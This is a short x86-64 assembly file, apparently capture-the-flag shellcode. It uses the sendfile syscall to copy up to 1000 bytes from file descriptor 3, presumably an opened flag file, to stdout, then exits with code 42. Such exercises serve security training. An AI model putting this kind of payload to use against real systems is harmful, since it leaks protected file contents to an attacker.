.global _start
_start:
.intel_syntax noprefix
    #sendfile(1, 3, 0 , 1000)
    mov rdi, 1
    mov rsi, 3
    mov rdx, 0
    mov r10, 1000
    mov rax, 0x28
    syscall

    # exit_group(42)
    mov edi, 42
    mov al, 0xe7
    syscall

.flag:
    .string "flag"
